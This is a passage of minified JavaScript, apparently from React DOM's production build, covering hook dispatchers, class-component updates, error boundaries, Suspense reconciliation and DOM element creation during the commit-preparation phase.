Qr={readContext:Ee,useCallback:te,useContext:te,useEffect:te,useImperativeHandle:te,useInsertionEffect:te,useLayoutEffect:te,useMemo:te,useReducer:te,useRef:te,useState:te,useDebugValue:te,useDeferredValue:te,useTransition:te,useMutableSource:te,useSyncExternalStore:te,useId:te,unstable_isNewReconciler:!1},af={readContext:Ee,useCallback:function(e,t){return _e().memoizedState=[e,t===void 0?null:t],e},useContext:Ee,useEffect:Ts,useImperativeHandle:function(e,t,n){return n=n!=null?n.concat([e]):null,Pr(4194308,4,ku.bind(null,t,e),n)},useLayoutEffect:function(e,t){return Pr(4194308,4,e,t)},useInsertionEffect:function(e,t){return Pr(4,2,e,t)},useMemo:function(e,t){var n=_e();return t=t===void 0?null:t,e=e(),n.memoizedState=[e,t],e},useReducer:function(e,t,n){var r=_e();return t=n!==void 0?n(t):t,r.memoizedState=r.baseState=t,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:t},r.queue=e,e=e.dispatch=lf.bind(null,U,e),[r.memoizedState,e]},useRef:function(e){var t=_e();return e={current:e},t.memoizedState=e},useState:xs,useDebugValue:xi,useDeferredValue:function(e){return _e().memoizedState=e},useTransition:function(){var e=xs(!1),t=e[0];return e=of.bind(null,e[1]),_e().memoizedState=e,[t,e]},useMutableSource:function(){},useSyncExternalStore:function(e,t,n){var r=U,o=_e();if(z){if(n===void 0)throw Error(y(407));n=n()}else{if(n=t(),Y===null)throw Error(y(349));Rt&30||pu(r,t,n)}o.memoizedState=n;var l={value:n,getSnapshot:t};return o.queue=l,Ts(hu.bind(null,r,l,e),[e]),r.flags|=2048,Gn(9,mu.bind(null,r,l,n,t),void 0,null),n},useId:function(){var e=_e(),t=Y.identifierPrefix;if(z){var n=Ve,r=Be;n=(r&~(1<<32-Le(r)-1)).toString(32)+n,t=":"+t+"R"+n,n=Jn++,0<n&&(t+="H"+n.toString(32)),t+=":"}else n=rf++,t=":"+t+"r"+n.toString(32)+":";return e.memoizedState=t},unstable_isNewReconciler:!1},uf={readContext:Ee,useCallback:xu,useContext:Ee,useEffect:Ci,useImperativeHandle:Cu,useInsertionEffect:Su,useLayoutEffect:wu,useMemo:Tu,useReducer:Bo,useRef:yu,useState:function(){return Bo($n)},useDebugValue:xi,useDeferredValue:function(e){var t=Pe();return Eu(t,G.memoizedState,e)},useTransition:function(){var e=Bo($n)[0],t=Pe().memoizedState;return[e,t]},useMutableSource:du,useSyncExternalStore:fu,useId:Pu,unstable_isNewReconciler:!1},cf={readContext:Ee,useCallback:xu,useContext:Ee,useEffect:Ci,useImperativeHandle:Cu,useInsertionEffect:Su,useLayoutEffect:wu,useMemo:Tu,useReducer:Vo,useRef:yu,useState:function(){return Vo($n)},useDebugValue:xi,useDeferredValue:function(e){var t=Pe();return G===null?t.memoizedState=e:Eu(t,G.memoizedState,e)},useTransition:function(){var e=Vo($n)[0],t=Pe().memoizedState;return[e,t]},useMutableSource:du,useSyncExternalStore:fu,useId:Pu,unstable_isNewReconciler:!1};function Ne(e,t){if(e&&e.defaultProps){t=W({},t),e=e.defaultProps;for(var n in e)t[n]===void 0&&(t[n]=e[n]);return t}return t}function El(e,t,n,r){t=e.memoizedState,n=n(r,t),n=n==null?t:W({},t,n),e.memoizedState=n,e.lanes===0&&(e.updateQueue.baseState=n)}var co={isMounted:function(e){return(e=e._reactInternals)?Lt(e)===e:!1},enqueueSetState:function(e,t,n){e=e._reactInternals;var r=ie(),o=ct(e),l=be(r,o);l.payload=t,n!=null&&(l.callback=n),t=at(e,l,o),t!==null&&(De(t,e,o,r),Tr(t,e,o))},enqueueReplaceState:function(e,t,n){e=e._reactInternals;var r=ie(),o=ct(e),l=be(r,o);l.tag=1,l.payload=t,n!=null&&(l.callback=n),t=at(e,l,o),t!==null&&(De(t,e,o,r),Tr(t,e,o))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var n=ie(),r=ct(e),o=be(n,r);o.tag=2,t!=null&&(o.callback=t),t=at(e,o,r),t!==null&&(De(t,e,r,n),Tr(t,e,r))}};function Es(e,t,n,r,o,l,i){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(r,l,i):t.prototype&&t.prototype.isPureReactComponent?!Hn(n,r)||!Hn(o,l):!0}function Mu(e,t,n){var r=!1,o=pt,l=t.contextType;return typeof l=="object"&&l!==null?l=Ee(l):(o=pe(t)?Pt:oe.current,r=t.contextTypes,l=(r=r!=null)?Zt(e,o):pt),t=new t(n,l),e.memoizedState=t.state!==null&&t.state!==void 0?t.state:null,t.updater=co,e.stateNode=t,t._reactInternals=e,r&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=o,e.__reactInternalMemoizedMaskedChildContext=l),t}function Ps(e,t,n,r){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(n,r),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(n,r),t.state!==e&&co.enqueueReplaceState(t,t.state,null)}function Pl(e,t,n,r){var o=e.stateNode;o.props=n,o.state=e.memoizedState,o.refs={},hi(e);var l=t.contextType;typeof l=="object"&&l!==null?o.context=Ee(l):(l=pe(t)?Pt:oe.current,o.context=Zt(e,l)),o.state=e.memoizedState,l=t.getDerivedStateFromProps,typeof l=="function"&&(El(e,t,l,n),o.state=e.memoizedState),typeof t.getDerivedStateFromProps=="function"||typeof o.getSnapshotBeforeUpdate=="function"||typeof o.UNSAFE_componentWillMount!="function"&&typeof o.componentWillMount!="function"||(t=o.state,typeof o.componentWillMount=="function"&&o.componentWillMount(),typeof o.UNSAFE_componentWillMount=="function"&&o.UNSAFE_componentWillMount(),t!==o.state&&co.enqueueReplaceState(o,o.state,null),$r(e,n,o,r),o.state=e.memoizedState),typeof o.componentDidMount=="function"&&(e.flags|=4194308)}function rn(e,t){try{var n="",r=t;do n+=Fc(r),r=r.return;while(r);var o=n}catch(l){o=`
Error generating stack: `+l.message+`
`+l.stack}return{value:e,source:t,stack:o,digest:null}}function bo(e,t,n){return{value:e,source:null,stack:n??null,digest:t??null}}function jl(e,t){try{console.error(t.value)}catch(n){setTimeout(function(){throw n})}}var df=typeof WeakMap=="function"?WeakMap:Map;function Ou(e,t,n){n=be(-1,n),n.tag=3,n.payload={element:null};var r=t.value;return n.callback=function(){Yr||(Yr=!0,Fl=r),jl(e,t)},n}function Lu(e,t,n){n=be(-1,n),n.tag=3;var r=e.type.getDerivedStateFromError;if(typeof r=="function"){var o=t.value;n.payload=function(){return r(o)},n.callback=function(){jl(e,t)}}var l=e.stateNode;return l!==null&&typeof l.componentDidCatch=="function"&&(n.callback=function(){jl(e,t),typeof r!="function"&&(ut===null?ut=new Set([this]):ut.add(this));var i=t.stack;this.componentDidCatch(t.value,{componentStack:i!==null?i:""})}),n}function js(e,t,n){var r=e.pingCache;if(r===null){r=e.pingCache=new df;var o=new Set;r.set(t,o)}else o=r.get(t),o===void 0&&(o=new Set,r.set(t,o));o.has(n)||(o.add(n),e=Ef.bind(null,e,t,n),t.then(e,e))}function Rs(e){do{var t;if((t=e.tag===13)&&(t=e.memoizedState,t=t!==null?t.dehydrated!==null:!0),t)return e;e=e.return}while(e!==null);return null}function Ns(e,t,n,r,o){return e.mode&1?(e.flags|=65536,e.lanes=o,e):(e===t?e.flags|=65536:(e.flags|=128,n.flags|=131072,n.flags&=-52805,n.tag===1&&(n.alternate===null?n.tag=17:(t=be(-1,1),t.tag=2,at(n,t,1))),n.lanes|=1),e)}var ff=Qe.ReactCurrentOwner,de=!1;function le(e,t,n,r){t.child=e===null?su(t,null,n,r):tn(t,e.child,n,r)}function Ms(e,t,n,r,o){n=n.render;var l=t.ref;return Xt(t,o),r=wi(e,t,n,r,l,o),n=ki(),e!==null&&!de?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~o,Ke(e,t,o)):(z&&n&&ai(t),t.flags|=1,le(e,t,r,o),t.child)}function Os(e,t,n,r,o){if(e===null){var l=n.type;return typeof l=="function"&&!Oi(l)&&l.defaultProps===void 0&&n.compare===null&&n.defaultProps===void 0?(t.tag=15,t.type=l,Du(e,t,l,r,o)):(e=Mr(n.type,null,r,t,t.mode,o),e.ref=t.ref,e.return=t,t.child=e)}if(l=e.child,!(e.lanes&o)){var i=l.memoizedProps;if(n=n.compare,n=n!==null?n:Hn,n(i,r)&&e.ref===t.ref)return Ke(e,t,o)}return t.flags|=1,e=dt(l,r),e.ref=t.ref,e.return=t,t.child=e}function Du(e,t,n,r,o){if(e!==null){var l=e.memoizedProps;if(Hn(l,r)&&e.ref===t.ref)if(de=!1,t.pendingProps=r=l,(e.lanes&o)!==0)e.flags&131072&&(de=!0);else return t.lanes=e.lanes,Ke(e,t,o)}return Rl(e,t,n,r,o)}function Iu(e,t,n){var r=t.pendingProps,o=r.children,l=e!==null?e.memoizedState:null;if(r.mode==="hidden")if(!(t.mode&1))t.memoizedState={baseLanes:0,cachePool:null,transitions:null},I(Jt,he),he|=n;else{if(!(n&1073741824))return e=l!==null?l.baseLanes|n:n,t.lanes=t.childLanes=1073741824,t.memoizedState={baseLanes:e,cachePool:null,transitions:null},t.updateQueue=null,I(Jt,he),he|=e,null;t.memoizedState={baseLanes:0,cachePool:null,transitions:null},r=l!==null?l.baseLanes:n,I(Jt,he),he|=r}else l!==null?(r=l.baseLanes|n,t.memoizedState=null):r=n,I(Jt,he),he|=r;return le(e,t,o,n),t.child}function Au(e,t){var n=t.ref;(e===null&&n!==null||e!==null&&e.ref!==n)&&(t.flags|=512,t.flags|=2097152)}function Rl(e,t,n,r,o){var l=pe(n)?Pt:oe.current;return l=Zt(t,l),Xt(t,o),n=wi(e,t,n,r,l,o),r=ki(),e!==null&&!de?(t.updateQueue=e.updateQueue,t.flags&=-2053,e.lanes&=~o,Ke(e,t,o)):(z&&r&&ai(t),t.flags|=1,le(e,t,n,o),t.child)}function Ls(e,t,n,r,o){if(pe(n)){var l=!0;Wr(t)}else l=!1;if(Xt(t,o),t.stateNode===null)jr(e,t),Mu(t,n,r),Pl(t,n,r,o),r=!0;else if(e===null){var i=t.stateNode,s=t.memoizedProps;i.props=s;var a=i.context,c=n.contextType;typeof c=="object"&&c!==null?c=Ee(c):(c=pe(n)?Pt:oe.current,c=Zt(t,c));var f=n.getDerivedStateFromProps,m=typeof f=="function"||typeof i.getSnapshotBeforeUpdate=="function";m||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(s!==r||a!==c)&&Ps(t,i,r,c),Ze=!1;var h=t.memoizedState;i.state=h,$r(t,r,i,o),a=t.memoizedState,s!==r||h!==a||fe.current||Ze?(typeof f=="function"&&(El(t,n,f,r),a=t.memoizedState),(s=Ze||Es(t,n,s,r,h,a,c))?(m||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount()),typeof i.componentDidMount=="function"&&(t.flags|=4194308)):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=r,t.memoizedState=a),i.props=r,i.state=a,i.context=c,r=s):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),r=!1)}else{i=t.stateNode,uu(e,t),s=t.memoizedProps,c=t.type===t.elementType?s:Ne(t.type,s),i.props=c,m=t.pendingProps,h=i.context,a=n.contextType,typeof a=="object"&&a!==null?a=Ee(a):(a=pe(n)?Pt:oe.current,a=Zt(t,a));var S=n.getDerivedStateFromProps;(f=typeof S=="function"||typeof i.getSnapshotBeforeUpdate=="function")||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(s!==m||h!==a)&&Ps(t,i,r,a),Ze=!1,h=t.memoizedState,i.state=h,$r(t,r,i,o);var w=t.memoizedState;s!==m||h!==w||fe.current||Ze?(typeof S=="function"&&(El(t,n,S,r),w=t.memoizedState),(c=Ze||Es(t,n,c,r,h,w,a)||!1)?(f||typeof i.UNSAFE_componentWillUpdate!="function"&&typeof i.componentWillUpdate!="function"||(typeof i.componentWillUpdate=="function"&&i.componentWillUpdate(r,w,a),typeof i.UNSAFE_componentWillUpdate=="function"&&i.UNSAFE_componentWillUpdate(r,w,a)),typeof i.componentDidUpdate=="function"&&(t.flags|=4),typeof i.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof i.componentDidUpdate!="function"||s===e.memoizedProps&&h===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||s===e.memoizedProps&&h===e.memoizedState||(t.flags|=1024),t.memoizedProps=r,t.memoizedState=w),i.props=r,i.state=w,i.context=a,r=c):(typeof i.componentDidUpdate!="function"||s===e.memoizedProps&&h===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||s===e.memoizedProps&&h===e.memoizedState||(t.flags|=1024),r=!1)}return Nl(e,t,n,r,l,o)}function Nl(e,t,n,r,o,l){Au(e,t);var i=(t.flags&128)!==0;if(!r&&!i)return o&&vs(t,n,!1),Ke(e,t,l);r=t.stateNode,ff.current=t;var s=i&&typeof n.getDerivedStateFromError!="function"?null:r.render();return t.flags|=1,e!==null&&i?(t.child=tn(t,e.child,null,l),t.child=tn(t,null,s,l)):le(e,t,s,l),t.memoizedState=r.state,o&&vs(t,n,!0),t.child}function _u(e){var t=e.stateNode;t.pendingContext?gs(e,t.pendingContext,t.pendingContext!==t.context):t.context&&gs(e,t.context,!1),gi(e,t.containerInfo)}function Ds(e,t,n,r,o){return en(),ci(o),t.flags|=256,le(e,t,n,r),t.child}var Ml={dehydrated:null,treeContext:null,retryLane:0};function Ol(e){return{baseLanes:e,cachePool:null,transitions:null}}function Fu(e,t,n){var r=t.pendingProps,o=H.current,l=!1,i=(t.flags&128)!==0,s;if((s=i)||(s=e!==null&&e.memoizedState===null?!1:(o&2)!==0),s?(l=!0,t.flags&=-129):(e===null||e.memoizedState!==null)&&(o|=1),I(H,o&1),e===null)return xl(t),e=t.memoizedState,e!==null&&(e=e.dehydrated,e!==null)?(t.mode&1?e.data==="$!"?t.lanes=8:t.lanes=1073741824:t.lanes=1,null):(i=r.children,e=r.fallback,l?(r=t.mode,l=t.child,i={mode:"hidden",children:i},!(r&1)&&l!==null?(l.childLanes=0,l.pendingProps=i):l=mo(i,r,0,null),e=Et(e,r,n,null),l.return=t,e.return=t,l.sibling=e,t.child=l,t.child.memoizedState=Ol(n),t.memoizedState=Ml,e):Ti(t,i));if(o=e.memoizedState,o!==null&&(s=o.dehydrated,s!==null))return pf(e,t,i,r,s,o,n);if(l){l=r.fallback,i=t.mode,o=e.child,s=o.sibling;var a={mode:"hidden",children:r.children};return!(i&1)&&t.child!==o?(r=t.child,r.childLanes=0,r.pendingProps=a,t.deletions=null):(r=dt(o,a),r.subtreeFlags=o.subtreeFlags&14680064),s!==null?l=dt(s,l):(l=Et(l,i,n,null),l.flags|=2),l.return=t,r.return=t,r.sibling=l,t.child=r,r=l,l=t.child,i=e.child.memoizedState,i=i===null?Ol(n):{baseLanes:i.baseLanes|n,cachePool:null,transitions:i.transitions},l.memoizedState=i,l.childLanes=e.childLanes&~n,t.memoizedState=Ml,r}return l=e.child,e=l.sibling,r=dt(l,{mode:"visible",children:r.children}),!(t.mode&1)&&(r.lanes=n),r.return=t,r.sibling=null,e!==null&&(n=t.deletions,n===null?(t.deletions=[e],t.flags|=16):n.push(e)),t.child=r,t.memoizedState=null,r}function Ti(e,t){return t=mo({mode:"visible",children:t},e.mode,0,null),t.return=e,e.child=t}function hr(e,t,n,r){return r!==null&&ci(r),tn(t,e.child,null,n),e=Ti(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function pf(e,t,n,r,o,l,i){if(n)return t.flags&256?(t.flags&=-257,r=bo(Error(y(422))),hr(e,t,i,r)):t.memoizedState!==null?(t.child=e.child,t.flags|=128,null):(l=r.fallback,o=t.mode,r=mo({mode:"visible",children:r.children},o,0,null),l=Et(l,o,i,null),l.flags|=2,r.return=t,l.return=t,r.sibling=l,t.child=r,t.mode&1&&tn(t,e.child,null,i),t.child.memoizedState=Ol(i),t.memoizedState=Ml,l);if(!(t.mode&1))return hr(e,t,i,null);if(o.data==="$!"){if(r=o.nextSibling&&o.nextSibling.dataset,r)var s=r.dgst;return r=s,l=Error(y(419)),r=bo(l,r,void 0),hr(e,t,i,r)}if(s=(i&e.childLanes)!==0,de||s){if(r=Y,r!==null){switch(i&-i){case 4:o=2;break;case 16:o=8;break;case 64:case 128:case 256:case 512:case 1024:case 2048:case 4096:case 8192:case 16384:case 32768:case 65536:case 131072:case 262144:case 524288:case 1048576:case 2097152:case 4194304:case 8388608:case 16777216:case 33554432:case 67108864:o=32;break;case 536870912:o=268435456;break;default:o=0}o=o&(r.suspendedLanes|i)?0:o,o!==0&&o!==l.retryLane&&(l.retryLane=o,Ge(e,o),De(r,e,o,-1))}return Mi(),r=bo(Error(y(421))),hr(e,t,i,r)}return o.data==="$?"?(t.flags|=128,t.child=e.child,t=Pf.bind(null,e),o._reactRetry=t,null):(e=l.treeContext,ge=st(o.nextSibling),ve=t,z=!0,Oe=null,e!==null&&(ke[Ce++]=Be,ke[Ce++]=Ve,ke[Ce++]=jt,Be=e.id,Ve=e.overflow,jt=t),t=Ti(t,r.children),t.flags|=4096,t)}function Is(e,t,n){e.lanes|=t;var r=e.alternate;r!==null&&(r.lanes|=t),Tl(e.return,t,n)}function Jo(e,t,n,r,o){var l=e.memoizedState;l===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:r,tail:n,tailMode:o}:(l.isBackwards=t,l.rendering=null,l.renderingStartTime=0,l.last=r,l.tail=n,l.tailMode=o)}function zu(e,t,n){var r=t.pendingProps,o=r.revealOrder,l=r.tail;if(le(e,t,r.children,n),r=H.current,r&2)r=r&1|2,t.flags|=128;else{if(e!==null&&e.flags&128)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&Is(e,n,t);else if(e.tag===19)Is(e,n,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}r&=1}if(I(H,r),!(t.mode&1))t.memoizedState=null;else switch(o){case"forwards":for(n=t.child,o=null;n!==null;)e=n.alternate,e!==null&&Gr(e)===null&&(o=n),n=n.sibling;n=o,n===null?(o=t.child,t.child=null):(o=n.sibling,n.sibling=null),Jo(t,!1,o,n,l);break;case"backwards":for(n=null,o=t.child,t.child=null;o!==null;){if(e=o.alternate,e!==null&&Gr(e)===null){t.child=o;break}e=o.sibling,o.sibling=n,n=o,o=e}Jo(t,!0,n,null,l);break;case"together":Jo(t,!1,null,null,void 0);break;default:t.memoizedState=null}return t.child}function jr(e,t){!(t.mode&1)&&e!==null&&(e.alternate=null,t.alternate=null,t.flags|=2)}function Ke(e,t,n){if(e!==null&&(t.dependencies=e.dependencies),Nt|=t.lanes,!(n&t.childLanes))return null;if(e!==null&&t.child!==e.child)throw Error(y(153));if(t.child!==null){for(e=t.child,n=dt(e,e.pendingProps),t.child=n,n.return=t;e.sibling!==null;)e=e.sibling,n=n.sibling=dt(e,e.pendingProps),n.return=t;n.sibling=null}return t.child}function mf(e,t,n){switch(t.tag){case 3:_u(t),en();break;case 5:cu(t);break;case 1:pe(t.type)&&Wr(t);break;case 4:gi(t,t.stateNode.containerInfo);break;case 10:var r=t.type._context,o=t.memoizedProps.value;I(br,r._currentValue),r._currentValue=o;break;case 13:if(r=t.memoizedState,r!==null)return r.dehydrated!==null?(I(H,H.current&1),t.flags|=128,null):n&t.child.childLanes?Fu(e,t,n):(I(H,H.current&1),e=Ke(e,t,n),e!==null?e.sibling:null);I(H,H.current&1);break;case 19:if(r=(n&t.childLanes)!==0,e.flags&128){if(r)return zu(e,t,n);t.flags|=128}if(o=t.memoizedState,o!==null&&(o.rendering=null,o.tail=null,o.lastEffect=null),I(H,H.current),r)break;return null;case 22:case 23:return t.lanes=0,Iu(e,t,n)}return Ke(e,t,n)}var Hu,Ll,Uu,Wu;Hu=function(e,t){for(var n=t.child;n!==null;){if(n.tag===5||n.tag===6)e.appendChild(n.stateNode);else if(n.tag!==4&&n.child!==null){n.child.return=n,n=n.child;continue}if(n===t)break;for(;n.sibling===null;){if(n.return===null||n.return===t)return;n=n.return}n.sibling.return=n.return,n=n.sibling}};Ll=function(){};Uu=function(e,t,n,r){var o=e.memoizedProps;if(o!==r){e=t.stateNode,xt(He.current);var l=null;switch(n){case"input":o=el(e,o),r=el(e,r),l=[];break;case"select":o=W({},o,{value:void 0}),r=W({},r,{value:void 0}),l=[];break;case"textarea":o=rl(e,o),r=rl(e,r),l=[];break;default:typeof o.onClick!="function"&&typeof r.onClick=="function"&&(e.onclick=Hr)}ll(n,r);var i;n=null;for(c in o)if(!r.hasOwnProperty(c)&&o.hasOwnProperty(c)&&o[c]!=null)if(c==="style"){var s=o[c];for(i in s)s.hasOwnProperty(i)&&(n||(n={}),n[i]="")}else c!=="dangerouslySetInnerHTML"&&c!=="children"&&c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&c!=="autoFocus"&&(Ln.hasOwnProperty(c)?l||(l=[]):(l=l||[]).push(c,null));for(c in r){var a=r[c];if(s=o!=null?o[c]:void 0,r.hasOwnProperty(c)&&a!==s&&(a!=null||s!=null))if(c==="style")if(s){for(i in s)!s.hasOwnProperty(i)||a&&a.hasOwnProperty(i)||(n||(n={}),n[i]="");for(i in a)a.hasOwnProperty(i)&&s[i]!==a[i]&&(n||(n={}),n[i]=a[i])}else n||(l||(l=[]),l.push(c,n)),n=a;else c==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,s=s?s.__html:void 0,a!=null&&s!==a&&(l=l||[]).push(c,a)):c==="children"?typeof a!="string"&&typeof a!="number"||(l=l||[]).push(c,""+a):c!=="suppressContentEditableWarning"&&c!=="suppressHydrationWarning"&&(Ln.hasOwnProperty(c)?(a!=null&&c==="onScroll"&&A("scroll",e),l||s===a||(l=[])):(l=l||[]).push(c,a))}n&&(l=l||[]).push("style",n);var c=l;(t.updateQueue=c)&&(t.flags|=4)}};Wu=function(e,t,n,r){n!==r&&(t.flags|=4)};function vn(e,t){if(!z)switch(e.tailMode){case"hidden":t=e.tail;for(var n=null;t!==null;)t.alternate!==null&&(n=t),t=t.sibling;n===null?e.tail=null:n.sibling=null;break;case"collapsed":n=e.tail;for(var r=null;n!==null;)n.alternate!==null&&(r=n),n=n.sibling;r===null?t||e.tail===null?e.tail=null:e.tail.sibling=null:r.sibling=null}}function ne(e){var t=e.alternate!==null&&e.alternate.child===e.child,n=0,r=0;if(t)for(var o=e.child;o!==null;)n|=o.lanes|o.childLanes,r|=o.subtreeFlags&14680064,r|=o.flags&14680064,o.return=e,o=o.sibling;else for(o=e.child;o!==null;)n|=o.lanes|o.childLanes,r|=o.subtreeFlags,r|=o.flags,o.return=e,o=o.sibling;return e.subtreeFlags|=r,e.childLanes=n,t}function hf(e,t,n){var r=t.pendingProps;switch(ui(t),t.tag){case 2:case 16:case 15:case 0:case 11:case 7:case 8:case 12:case 9:case 14:return ne(t),null;case 1:return pe(t.type)&&Ur(),ne(t),null;case 3:return r=t.stateNode,nn(),_(fe),_(oe),yi(),r.pendingContext&&(r.context=r.pendingContext,r.pendingContext=null),(e===null||e.child===null)&&(pr(t)?t.flags|=4:e===null||e.memoizedState.isDehydrated&&!(t.flags&256)||(t.flags|=1024,Oe!==null&&(Ul(Oe),Oe=null))),Ll(e,t),ne(t),null;case 5:vi(t);var o=xt(bn.current);if(n=t.type,e!==null&&t.stateNode!=null)Uu(e,t,n,r,o),e.ref!==t.ref&&(t.flags|=512,t.flags|=2097152);else{if(!r){if(t.stateNode===null)throw Error(y(166));return ne(t),null}if(e=xt(He.current),pr(t)){r=t.stateNode,n=t.type;var l=t.memoizedProps;switch(r[Fe]=t,r[Bn]=l,e=(t.mode&1)!==0,n){case"dialog":A("cancel",r),A("close",r);break;case"iframe":case"object":case"embed":A("load",r);break;case"video":case"audio":for(o=0;o<Cn.length;o++)A(Cn[o],r);break;case"source":A("error",r);break;case"img":case"image":case"link":A("error",r),A("load",r);break;case"details":A("toggle",r);break;case"input":Vi(r,l),A("invalid",r);break;case"select":r._wrapperState={wasMultiple:!!l.multiple},A("invalid",r);break;case"textarea":Ji(r,l),A("invalid",r)}ll(n,l),o=null;for(var i in l)if(l.hasOwnProperty(i)){var s=l[i];i==="children"?typeof s=="string"?r.textContent!==s&&(l.suppressHydrationWarning!==!0&&fr(r.textContent,s,e),o=["children",s]):typeof s=="number"&&r.textContent!==""+s&&(l.suppressHydrationWarning!==!0&&fr(r.textContent,s,e),o=["children",""+s]):Ln.hasOwnProperty(i)&&s!=null&&i==="onScroll"&&A("scroll",r)}switch(n){case"input":or(r),bi(r,l,!0);break;case"textarea":or(r),$i(r);break;case"select":case"option":break;default:typeof l.onClick=="function"&&(r.onclick=Hr)}r=o,t.updateQueue=r,r!==null&&(t.flags|=4)}else{i=o.nodeType===9?o:o.ownerDocument,e==="http://www.w3.org/1999/xhtml"&&(e=ha(n)),e==="http://www.w3.org/1999/xhtml"?n==="script"?(e=i.createElement("div"),e.innerHTML="<script><\/script>",e=e.removeChild(e.firstChild)):typeof r.is=="string"?e=i.createElement(n,{is:r.is}):(e=i.createElement(n),n==="select"&&(i=e,r.multiple?i.multiple=!0:r.size&&(i.size=r.size))):e=i.createElementNS(e,n),e[Fe]=t,e[Bn]=r,Hu(e,t,!1,!1),t.stateNode=e;e:{switch(i=il(n,r),n){case"dialog":A("cancel",e),A("close",e),o=r;break;case"iframe":case"object":case"embed":A("load",e),o=r;break;case"video":case"audio":for(o=0;o<Cn.length;o++)A(Cn[o],e);o=r;break;case"source":A("error",e),o=r;break;case"img":case"image":case"link":A("error",e),A("load",e),o=r;break;case"details":A("toggle",e),o=r;break;case"input":Vi(e,r),o=el(e,r),A("invalid",e);break;case"option":o=r;break;case"select":e._wrapperState={wasMultiple:!!r.multiple},o=W({},r,{value:void 0}),A("invalid",e);break;case"textarea":Ji(e,r),o=rl(e,r),A("invalid",e);break;default:o=r}ll(n,o),s=o;for(l in s)if(s.hasOwnProperty(l)){var a=s[l];l==="style"?ya(e,a):l==="dangerouslySetInnerHTML"?(a=a?a.__html:void 0,a!=null&&ga(e,a)):l==="children"?typeof a=="string"?(n!=="textarea"||a!=="")&&Dn(e,a):typeof a=="number"&&Dn(e,""+a):l!=="suppressContentEditableWarning"&&l!=="suppressHydrationWarning"&&l!=="autoFocus"&&(Ln.hasOwnProperty(l)?a!=null&&l==="onScroll"&&A("scroll",e):a!=null&&Kl(e,l,a,i))}switch(n){case"input":or(e),bi(e,r,!1);break;case"textarea":or(e),$i(e);break;case"option":r.value!=null&&e.setAttribute("value",""+ft(r.value));break;case"select":e.multiple=!!r.multiple,l=r.value,l!=null?$t(e,!!r.multiple,l,!1):r.defaultValue!=null&&$t(e,!!r.multiple,r.defaultValue,!0);break;default:typeof o.onClick=="function"&&(e.onclick=Hr)}switch(n){case"button":case"input":case"select":case"textarea":r=!!r.autoFocus;break e;case"img":r=!0;break e;default:r=!1}}r&&(t.flags|=4)}t.ref!==null&&(t.flags|=512,t.flags|=2097152)}return ne(t),null;case 6:if(e&&t.stateNode!=null)Wu(e,t,e.memoizedProps,r);else{if(typeof r!="string"&&t.stateNode===null)throw Error(y(166));if(n=xt(bn.current),xt(He.current),pr(t)){if(r=t.stateNode,n=t.memoizedProps,r[Fe]=t,(l=r.nodeValue!==n)&&(e=ve,e!==null))switch(e.tag){case 3:fr(r.nodeValue,n,(e.mode&1)!==0);break;case 5:e.memoizedProps.suppressHydrationWarning!==!0&&fr(r.nodeValue,n,(e.mode&1)!==0)}l&&(t.flags|=4)}else r=(n.nodeType===9?n:n.ownerDocument).createTextNode(r),r[Fe]=t,t.stateNode=r}return ne(t),null;case 13:if(_(H),r=t.memoizedState,e===null||e.memoizedState!==null&&e.memoizedState.dehydrated!==null){if(z&&ge!==null&&t.mode&1&&!(t.flags&128))lu(),en(),t.flags|=98560,l=!1;else if(l=pr(t),r!==null&&r.dehydrated!==null){if(e===null){if(!l)throw Error(y(318));if(l=t.memoizedState,l=l!==null?l.dehydrated:null,!l)throw Error(y(317));l[Fe]=t}else en(),!(t.flags&128)&&(t.memoizedState=null),t.flags|=4;ne(t),l=!1}else Oe!==null&&(Ul(Oe),Oe=null),l=!0;if(!l)return t.flags&65536?t:null}return t.flags&128?(t.lanes=n,t):(r=r!==null,r!==(e!==null&&e.memoizedState!==null)&&r&&(t.child.flags|=8192,t.mode&1&&(e===null||H.current&1?K===0&&(K=3):Mi())),t.updateQueue!==null&&(t.flags|=4),ne(t),null);case 4:return nn(),Ll(e,t),e===null&&Un(t.stateNode.containerInfo),ne(t),null;case 10:return pi(t.type._context),ne(t),null;case 17:return pe(t.type)&&Ur(),ne(t),null;case 19:if(_(H),l=t.memoizedState,l===null)return 